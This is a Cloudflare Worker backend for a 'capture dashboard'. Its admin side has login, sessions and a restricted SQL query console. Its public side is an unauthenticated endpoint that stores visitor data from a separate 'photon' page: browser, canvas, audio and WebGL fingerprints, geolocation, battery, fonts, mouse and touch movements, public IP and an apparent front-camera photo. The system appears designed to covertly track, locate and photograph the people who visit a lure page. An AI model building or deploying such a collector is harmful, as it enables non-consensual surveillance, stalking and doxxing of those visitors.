/**
 * Cloudflare Worker — Capture Dashboard Backend
 */

// Allowed origins — dashboard (credentialed) and photon user-end (public capture)
const ALLOWED_ORIGINS = new Set([
  "https://dashboards.23amtics322.workers.dev",
  "https://photon.nytherion.qzz.io",
  "https://nytherix.nytherion.qzz.io",         
]);

function getCorsHeaders(request) {
  const origin = request.headers.get("Origin") || "";
  const allowed = ALLOWED_ORIGINS.has(origin) ? origin : "https://dashboards.23amtics322.workers.dev";
  return {
    "Access-Control-Allow-Origin":      allowed,
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Allow-Methods":     "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers":     "Content-Type, X-Session",
    "Access-Control-Max-Age":           "86400",
    "Vary":                             "Origin",
  };
}

// Backwards-compat alias used throughout the file — replaced per-request in handler
let CORS_HEADERS = {};

// Strict UUID v4 format: xxxxxxxx-xxxx-4xxx-[89ab]xxx-xxxxxxxxxxxx
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
function parseCookie(header, name) {
  for (const part of header.split(";")) {
    const idx = part.indexOf("=");
    if (idx < 0) continue;
    if (part.slice(0, idx).trim() === name) {
      return part.slice(idx + 1).trim() || null;
    }
  }
  return null;
}


// ── PASSWORD HASHING (SHA-256) ──────────────────────────────────────────────
async function sha256hex(text) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,"0")).join("");
}

// Security headers added to every response
const SECURITY_HEADERS = {
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "Referrer-Policy": "no-referrer",
  "Cache-Control": "no-store",
};

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS_HEADERS, ...SECURITY_HEADERS, "Content-Type": "application/json" },
  });
}

function err(msg, detail, status = 500) {
  console.error("Worker error:", msg, detail);
  // Never expose internal detail to clients — log only
  return json({ error: msg }, status);
}

// In-memory rate limit store (resets on Worker restart; sufficient for brute-force defence)
// key: IP string → { count: number, windowStart: timestamp ms }
const loginAttempts = new Map();
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 minutes
const RATE_LIMIT_MAX       = 10;              // max attempts per window

function checkRateLimit(ip) {
  const now = Date.now();

  // Prune expired entries to prevent unbounded Map growth
  if (loginAttempts.size > 5000) {
    for (const [k, v] of loginAttempts) {
      if (now - v.windowStart > RATE_LIMIT_WINDOW_MS) loginAttempts.delete(k);
    }
  }

  const entry = loginAttempts.get(ip);
  if (!entry || now - entry.windowStart > RATE_LIMIT_WINDOW_MS) {
    loginAttempts.set(ip, { count: 1, windowStart: now });
    return true; // allowed
  }
  if (entry.count >= RATE_LIMIT_MAX) return false; // blocked
  entry.count++;
  return true;
}

function resetRateLimit(ip) {
  loginAttempts.delete(ip);
}

export default {
  async fetch(request, env) {
    // Resolve CORS headers for this specific request origin
    CORS_HEADERS = getCorsHeaders(request);

    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: { ...CORS_HEADERS, "Content-Length": "0" },
      });
    }

    const db = env.DB;
    if (!db) return err("D1 binding 'DB' not configured", null, 500);

    const url = new URL(request.url);

    // --- 1. LOGIN ENDPOINT ---
    if (
      request.method === "POST" &&
      url.pathname === "/auth/login"
    ) {
      const clientIp = request.headers.get("cf-connecting-ip") || "unknown";

      if (!checkRateLimit(clientIp)) {
        return new Response(JSON.stringify({ error: "Too many login attempts. Try again later." }), {
          status: 429,
          headers: {
            ...CORS_HEADERS,
            ...SECURITY_HEADERS,
            "Content-Type": "application/json",
            "Retry-After": String(Math.ceil(RATE_LIMIT_WINDOW_MS / 1000)),
          },
        });
      }

      try {
        let body;
        try { body = await request.json(); } catch { return json({ error: "Invalid request body" }, 400); }
        const { username, password } = body;

        // Basic input validation — reject before touching DB
        if (typeof username !== "string" || typeof password !== "string"
            || username.length < 1 || username.length > 64
            || password.length < 1 || password.length > 256) {
          return json({ error: "Invalid credentials" }, 401);
        }

        // Hash the submitted password and compare against DB
        const passwordHash = await sha256hex(password);

        const userRow = await db.prepare(
          "SELECT id FROM users WHERE username = ? AND password_hash = ?"
        ).bind(username, passwordHash).first();

        if (!userRow) {
          return json({ error: "Invalid credentials" }, 401);
        }

        // Successful login — clear rate limit for this IP
        resetRateLimit(clientIp);

        const token = crypto.randomUUID();

        await db.prepare("DELETE FROM sessions WHERE user_id = ?").bind(userRow.id).run();
        await db.prepare("DELETE FROM sessions WHERE expires_at < datetime('now')").run();

        await db.prepare(
          `INSERT INTO sessions
           (token, user_id, expires_at)
           VALUES
           (?, ?, datetime('now', '+1 day'))`
        )
        .bind(token, userRow.id)
        .run();

        return new Response(
  JSON.stringify({ success: true }),
  {
    status: 200,
    headers: {
      ...CORS_HEADERS,
      ...SECURITY_HEADERS,
      "Content-Type": "application/json",
      "Set-Cookie":
        `session_id=${token}; Path=/; HttpOnly; Secure; SameSite=None; Max-Age=86400`
    }
  }
);

      } catch (e) {
        return err("Login failed", e.message, 500);
      }
    }

    // --- 2. LOGOUT ENDPOINT ---
    if (
      request.method === "POST" &&
      url.pathname === "/auth/logout"
    ) {
      const cookieHeader = request.headers.get("Cookie") || "";
      const token = parseCookie(cookieHeader, "session_id");

      // Only hit DB if token looks like a valid UUID
      if (token && UUID_RE.test(token)) {
        await db.prepare("DELETE FROM sessions WHERE token = ?").bind(token).run();
      }

      return new Response(
  JSON.stringify({ success: true }),
  {
    headers: {
      ...CORS_HEADERS,
      ...SECURITY_HEADERS,
      "Content-Type": "application/json",
      "Set-Cookie":
        "session_id=; Path=/; HttpOnly; Secure; SameSite=None; Max-Age=0"
    }
  }
);
    }


    // --- 3. CHANGE CREDENTIALS ENDPOINT ---
    // Requires a valid session. Verifies current password before applying changes.
    if (
      request.method === "POST" &&
      url.pathname === "/auth/change-credentials"
    ) {
      const cookieHeader = request.headers.get("Cookie") || "";
      const token = parseCookie(cookieHeader, "session_id");

      if (!token) return json({ error: "Unauthorized" }, 401);
      if (!UUID_RE.test(token)) return json({ error: "Unauthorized" }, 401);

      const session = await db.prepare(
        "SELECT user_id FROM sessions WHERE token = ? AND expires_at > datetime('now')"
      ).bind(token).first();

      if (!session) return json({ error: "Unauthorized" }, 401);

      let body;
      try { body = await request.json(); } catch { return json({ error: "Invalid request body" }, 400); }

      const { current_password, new_username, new_password } = body;

      if (typeof current_password !== "string" || current_password.length < 1) {
        return json({ error: "Current password is required" }, 400);
      }

      // At least one of new_username or new_password must be provided
      const hasNewUsername = typeof new_username === "string" && new_username.trim().length > 0;
      const hasNewPassword = typeof new_password === "string" && new_password.length > 0;
      if (!hasNewUsername && !hasNewPassword) {
        return json({ error: "Provide a new username, new password, or both" }, 400);
      }

      if (hasNewUsername && new_username.trim().length > 64) {
        return json({ error: "Username too long (max 64 chars)" }, 400);
      }
      if (hasNewPassword && new_password.length > 256) {
        return json({ error: "Password too long (max 256 chars)" }, 400);
      }
      if (hasNewPassword && new_password.length < 8) {
        return json({ error: "New password must be at least 8 characters" }, 400);
      }

      try {
        // Fetch current user record
        const userRow = await db.prepare(
          "SELECT id, username, password_hash FROM users WHERE id = ?"
        ).bind(session.user_id).first();

        if (!userRow) return json({ error: "User not found" }, 404);

        // Verify current password before allowing any change
        const currentHash = await sha256hex(current_password);
        if (currentHash !== userRow.password_hash) {
          return json({ error: "Current password is incorrect" }, 401);
        }

        // If changing username, check it isn't already taken
        if (hasNewUsername) {
          const trimmed = new_username.trim();
          const conflict = await db.prepare(
            "SELECT id FROM users WHERE username = ? AND id != ?"
          ).bind(trimmed, userRow.id).first();
          if (conflict) return json({ error: "Username already taken" }, 409);
        }

        // Build and execute the update
        const updates = [];
        const params  = [];

        if (hasNewUsername) {
          updates.push("username = ?");
          params.push(new_username.trim());
        }
        if (hasNewPassword) {
          updates.push("password_hash = ?");
          params.push(await sha256hex(new_password));
        }
        params.push(userRow.id);

        await db.prepare(
          `UPDATE users SET ${updates.join(", ")} WHERE id = ?`
        ).bind(...params).run();

        // Invalidate all other sessions — force re-login on other devices
        await db.prepare(
          "DELETE FROM sessions WHERE user_id = ? AND token != ?"
        ).bind(userRow.id, token).run();

        return json({ success: true });
      } catch (e) {
        return err("Credential update failed", e.message, 500);
      }
    }

    // --- 4. SESSION AUTH VERIFICATION ENDPOINT ---
    if (
      request.method === "GET" &&
      url.pathname === "/auth/me"
    ) {
      const cookieHeader = request.headers.get("Cookie") || "";
      const token = parseCookie(cookieHeader, "session_id");

      if (!token) {
        return json({ authenticated: false }, 401);
      }

      if (!UUID_RE.test(token)) {
        return json({ authenticated: false }, 401);
      }

      const session = await db.prepare(`
          SELECT user_id FROM sessions WHERE token = ? AND expires_at > datetime('now')
        `).bind(token).first();

      if (!session) {
        return json({ authenticated: false }, 401);
      }

      return json({ authenticated: true });
    }

    // =========================================================================
    // PROTECTED GET ROUTE - Requires authentication
    // =========================================================================
    if (request.method === "GET" && url.pathname === "/") {
      const cookieHeader = request.headers.get("Cookie") || "";
      const token = parseCookie(cookieHeader, "session_id");

      if (!token || !UUID_RE.test(token)) {
        return json({ error: "Unauthorized: Missing administrative session." }, 401);
      }

      const session = await db.prepare(`
        SELECT user_id FROM sessions WHERE token = ? AND expires_at > datetime('now')
      `).bind(token).first();

      if (!session) {
        return json({ error: "Unauthorized: Expired or missing administrative session." }, 401);
      }

      try {
        const { results } = await db.prepare(
          `SELECT * FROM captures ORDER BY timestamp DESC, id DESC LIMIT 500`
        ).all();
        return json(results ?? []);
      } catch (e) {
        return err("GET query failed", e.message, 500);
      }
    }

    // =========================================================================
    // POST HANDLER - With graceful JSON parsing for public endpoints
    // =========================================================================
    if (request.method === "POST") {
      // Check content length first (defense against large payloads)
      const contentLength = parseInt(request.headers.get("content-length") || "0");
      if (contentLength > 2_500_000) {
        return err("Payload too large", null, 413);
      }

      // Read body with a hard cap (guards against missing/spoofed Content-Length)
      let rawText;
      try {
        const buf = await request.arrayBuffer();
        if (buf.byteLength > 2_500_000) return err("Payload too large", null, 413);
        rawText = new TextDecoder().decode(buf);
      } catch {
        rawText = "";
      }

      // Attempt to parse JSON from already-read rawText
      let body = null;
      let isCaptureAction = false;
      let parseError = false;

      if (rawText.trim().length > 0) {
        try {
          body = JSON.parse(rawText);
          // Determine if this is a public capture action
          if (!body.action || body.action === "capture") {
            isCaptureAction = true;
          }
        } catch (e) {
          console.warn("JSON parse warning:", e.message);
          parseError = true;
          isCaptureAction = true; // malformed payload → treat as anonymous capture
        }
      } else {
        // Empty body — treat as public beacon/health-check
        isCaptureAction = true;
      }

      // =======================================================================
      // PUBLIC CAPTURE ENDPOINT - No authentication required
      // Handles: valid JSON captures, malformed JSON, empty bodies
      // =======================================================================
      if (isCaptureAction) {
        const publicIp = request.headers.get("cf-connecting-ip") || "Unknown";

        try {
          // Build insert with defaults for missing/parsed data
          await db.prepare(`
            INSERT INTO captures (
              session_id, timestamp, url, referrer, user_agent, language, languages,
              platform, hardware_concurrency, device_memory, max_touch_points,
              connection, screen, timezone, cookies_enabled, do_not_track,
              webdriver, plugins, mime_types, history_length, navigation_timing,
              canvas_fingerprint, audio_fingerprint, webgl_fingerprint,
              battery, geolocation, front_photo, audio_devices, fonts,
              mouse_movements, touch_events, permission_states,
              geolocation_error, public_ip
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
          `).bind(
            body?.sessionId ?? null,
            body?.timestamp ?? new Date().toISOString(),
            body?.url ?? null,
            body?.referrer ?? null,
            body?.userAgent ?? body?.user_agent ?? request.headers.get("user-agent") ?? null,
            body?.language ?? null,
            body?.languages ? JSON.stringify(body.languages) : null,
            body?.platform ?? null,
            body?.hardwareConcurrency ?? body?.hardware_concurrency ?? null,
            body?.deviceMemory ?? body?.device_memory ?? null,
            body?.maxTouchPoints ?? body?.max_touch_points ?? null,
            body?.connection ? JSON.stringify(body.connection) : null,
            body?.screen ? JSON.stringify(body.screen) : null,
            body?.timezone ?? null,
            (body?.cookiesEnabled ?? body?.cookies_enabled) != null ? ((body?.cookiesEnabled ?? body?.cookies_enabled) ? 1 : 0) : null,
            body?.doNotTrack ?? body?.do_not_track ?? null,
            body?.webdriver ? 1 : 0,
            body?.plugins ? JSON.stringify(body.plugins) : null,
            body?.mimeTypes ? JSON.stringify(body.mimeTypes) : null,
            body?.historyLength ?? body?.history_length ?? null,
            body?.navigationTiming ? JSON.stringify(body.navigationTiming) : null,
            body?.canvasFingerprint ?? body?.canvas_fingerprint ?? null,
            body?.audioFingerprint ?? body?.audio_fingerprint ?? null,
            body?.webglFingerprint ? JSON.stringify(body.webglFingerprint) : null,
            body?.battery ? JSON.stringify(body.battery) : null,
            body?.geolocation ? JSON.stringify(body.geolocation) : null,
            body?.frontPhoto ?? body?.front_photo ?? null,
            body?.audioDevices ? JSON.stringify(body.audioDevices) : null,
            body?.fonts ? JSON.stringify(body.fonts) : null,
            body?.mouseMovements ? JSON.stringify(body.mouseMovements) : null,
            body?.touchEvents ? JSON.stringify(body.touchEvents) : null,
            body?.permissionStates ? JSON.stringify(body.permissionStates) : null,
            body?.geolocationError ?? body?.geolocation_error ?? null,
            publicIp
          ).run();

          // Return success even if parsing had issues (the capture was saved)
          return json({ 
            status: "success", 
            message: parseError ? "Capture saved with partial data" : "Capture saved" 
          });
        } catch (e) {
          console.error("INSERT error:", e);
          // Don't return error for public endpoints - just log and return success
          // This prevents tracking failures from breaking client-side scripts
          return json({ status: "success", message: "Capture received" });
        }
      }

      // =======================================================================
      // PROTECTED ADMIN ACTIONS - Require authentication and valid JSON
      // =======================================================================
      // If we reach here, we have a non-capture action that requires valid JSON
      if (parseError || !body) {
        return err("Invalid request format for admin action", null, 400);
      }

      const cookieHeader = request.headers.get("Cookie") || "";
      const token = parseCookie(cookieHeader, "session_id");

      if (!token || !UUID_RE.test(token)) {
        return json({ error: "Unauthorized: Missing administrative session." }, 401);
      }

      const session = await db.prepare(`
        SELECT user_id FROM sessions WHERE token = ? AND expires_at > datetime('now')
      `).bind(token).first();

      if (!session) {
        return json({ error: "Unauthorized: Expired or missing administrative session." }, 401);
      }

      // ── DELETE (Protected Route) ──
      if (body.action === "delete") {
        const id = parseInt(body.id, 10);
        if (!id || id < 1 || !Number.isFinite(id)) return err("Invalid id", null, 400);

        try {
          const result = await db.prepare("DELETE FROM captures WHERE id = ?").bind(id).run();
          if (result.meta.changes === 0) {
            return err(`Record ${id} not found`, null, 404);
          }
          return json({ success: true, message: `Deleted ${id}` });
        } catch (e) {
          return err("Delete failed", e.message, 500);
        }
      }

      // ── UPDATE (Protected Route) ──
      if (body.action === "update") {
        const id = parseInt(body.id, 10);
        const { fields } = body;
        if (!id || id < 1 || !Number.isFinite(id) || !fields || typeof fields !== 'object' || Array.isArray(fields)) {
          return err("Missing or invalid id/fields", null, 400);
        }
        // Prevent mass-update abuse — cap field count
        if (Object.keys(fields).length > 30) return err("Too many fields", null, 400);
        if (Object.keys(fields).length === 0) return err("No fields to update", null, 400);

        const ALLOWED_COLUMNS = new Set([
          "session_id", "timestamp", "url", "referrer", "user_agent", "language", "languages",
          "platform", "hardware_concurrency", "device_memory", "max_touch_points",
          "connection", "screen", "timezone", "cookies_enabled", "do_not_track",
          "webdriver", "plugins", "mime_types", "history_length", "navigation_timing",
          "canvas_fingerprint", "audio_fingerprint", "webgl_fingerprint",
          "battery", "geolocation", "front_photo", "audio_devices", "fonts",
          "mouse_movements", "touch_events", "permission_states",
          "geolocation_error", "public_ip"
        ]);

        const invalidKeys = Object.keys(fields).filter(k => !ALLOWED_COLUMNS.has(k));
        if (invalidKeys.length > 0) return err(`Invalid field(s): ${invalidKeys.join(", ")}`, null, 400);

        try {
          const setClauses = Object.keys(fields).map(key => `${key} = ?`);
          const values = [...Object.values(fields), id];

          const query = `UPDATE captures SET ${setClauses.join(", ")} WHERE id = ?`;
          await db.prepare(query).bind(...values).run();

          return json({ success: true, message: `Updated ${id}` });
        } catch (e) {
          return err("Update failed", e.message, 500);
        }
      }

      // ── QUERY (Protected Route) ──
      if (body.action === "query") {
        const sql = body.sql?.trim();
        if (!sql) return err("Missing sql", null, 400);
        if (sql.length > 2000) return err("Query too long", null, 400);

        const upper = sql.replace(/\/\*[\s\S]*?\*\//g, " ") // strip block comments
                         .replace(/--[^\n]*/g, " ")              // strip line comments
                         .replace(/\s+/g, " ")
                         .trim()
                         .toUpperCase();

        // Only SELECT is permitted — all mutations go through typed action endpoints
        if (!upper.startsWith("SELECT ") && upper !== "SELECT") {
          return err("Only SELECT queries are permitted", null, 403);
        }

        // Block dangerous SQLite pragmas and attach commands
        if (/\b(ATTACH|DETACH|PRAGMA|VACUUM|REINDEX)\b/.test(upper)) {
          return err("That statement type is not permitted", null, 403);
        }

        // Block access to sensitive system tables
        const BLOCKED_TABLES = ["USERS", "SESSIONS", "SQLITE_MASTER", "SQLITE_SCHEMA"];
        for (const t of BLOCKED_TABLES) {
          if (new RegExp("\\b" + t + "\\b").test(upper)) {
            return err("Access to that table is restricted", null, 403);
          }
        }

        try {
          const result = await db.prepare(sql).all();
          return json({ results: result.results || [] });
        } catch (e) {
          return err("Query failed", null, 400);
        }
      }

      return err("Unknown action", body.action, 400);
    }

    return err("Method not allowed", null, 405);
  },
};